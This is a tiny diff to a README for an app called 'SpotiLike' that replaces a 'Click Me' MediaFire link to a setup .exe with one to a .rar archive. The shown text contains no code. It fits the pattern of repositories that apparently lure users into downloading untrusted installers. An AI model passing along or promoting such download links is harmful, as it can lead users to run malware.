@@ -1,6 +1,6 @@
 # SpotiLike 💚
 
-[Click Me]: https://www.mediafire.com/file/22oaqpg0whtq1co/SpotiLike_Setup.exe/file
+[Click Me]: https://www.mediafire.com/file/akeknk82cn20fqp/SpotiLike_Setup.rar/file
 
 Hello. 👋
 
